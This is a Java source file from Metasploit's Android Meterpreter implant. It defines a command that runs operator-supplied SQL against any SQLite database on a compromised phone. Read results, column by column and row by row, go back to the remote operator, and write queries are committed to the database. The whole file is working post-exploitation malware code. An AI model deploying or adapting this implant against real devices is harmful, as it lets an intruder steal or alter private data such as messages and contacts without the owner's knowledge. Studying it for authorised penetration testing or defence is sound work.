package com.metasploit.meterpreter.android;

import android.database.sqlite.SQLiteDatabase;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class android_sqlite_query implements Command {

    private static final int TLV_EXTENSIONS = 20000;
    public static final int TLV_TYPE_SQLITE_RESULT_GROUP = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9080);
    public static final int TLV_TYPE_SQLITE_NAME = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9081);
    public static final int TLV_TYPE_SQLITE_QUERY = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9082);
    public static final int TLV_TYPE_SQLITE_RESULT_COLS = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9083);
    public static final int TLV_TYPE_SQLITE_RESULT_ROW = TLVPacket.TLV_META_TYPE_GROUP
            | (TLV_EXTENSIONS + 9084);
    public static final int TLV_TYPE_SQLITE_VALUE = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9085);
    public static final int TLV_TYPE_SQLITE_ERROR = TLVPacket.TLV_META_TYPE_STRING
            | (TLV_EXTENSIONS + 9086);
    public static final int TLV_TYPE_SQLITE_WRITE = TLVPacket.TLV_META_TYPE_BOOL
            | (TLV_EXTENSIONS + 9087);

    @Override
    public int execute(Meterpreter meterpreter, TLVPacket request,
                       TLVPacket response) throws Exception {

        String dbpath = request.getStringValue(TLV_TYPE_SQLITE_NAME);
        String query = request.getStringValue(TLV_TYPE_SQLITE_QUERY);
        boolean writeable = request.getBooleanValue(TLV_TYPE_SQLITE_WRITE);

        SQLiteDatabase db = null;
        Cursor c = null;
        try {
            if (writeable) {
                db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READWRITE);
                db.beginTransaction();
                db.execSQL(query);
                db.setTransactionSuccessful();
            } else {
                db = SQLiteDatabase.openDatabase(dbpath, null, SQLiteDatabase.OPEN_READONLY);
                c = db.rawQuery(query, null);
                if (c.getCount() > 0) {
                    String[] columns = c.getColumnNames();
                    TLVPacket grp = new TLVPacket();
                    TLVPacket cols = new TLVPacket();
                    for (int i=0; i < columns.length; i++){
                        cols.addOverflow(TLV_TYPE_SQLITE_VALUE, columns[i]);
                    }
                    grp.addOverflow(TLV_TYPE_SQLITE_RESULT_COLS, cols);

                    c.moveToFirst();
                    do {
                        TLVPacket row = new TLVPacket();
                        for (int i=0; i < columns.length; i++){
                            row.addOverflow(TLV_TYPE_SQLITE_VALUE, c.getString(i));
                        }
                        grp.addOverflow(TLV_TYPE_SQLITE_RESULT_ROW, row);
                    } while (c.moveToNext());

                    response.addOverflow(TLV_TYPE_SQLITE_RESULT_GROUP, grp);
                }
            }
        } catch (SQLiteException e) {
            response.addOverflow(TLV_TYPE_SQLITE_ERROR, e.getMessage());
        } finally {
            if (c != null) {
                c.close();
            }
            if (db != null) {
                if (writeable) {
                    db.endTransaction();
                }
                db.close();
            }
        }
        return ERROR_SUCCESS;
    }

}
